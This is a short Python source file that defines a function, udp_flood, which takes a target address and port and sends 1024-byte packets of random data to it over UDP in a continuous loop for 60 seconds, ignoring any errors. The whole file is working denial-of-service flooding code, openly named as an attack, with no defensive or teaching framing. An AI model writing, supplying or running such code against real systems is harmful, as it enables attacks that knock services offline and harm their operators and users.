import socket
import random
import time

def udp_flood(target):
    ip = target.split(":")[0]
    port = int(target.split(":")[1]) if ":" in target else 80
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(1024)
    end = time.time() + 60

    while time.time() < end:
        try:
            sock.sendto(data, (ip, port))
        except:
            pass
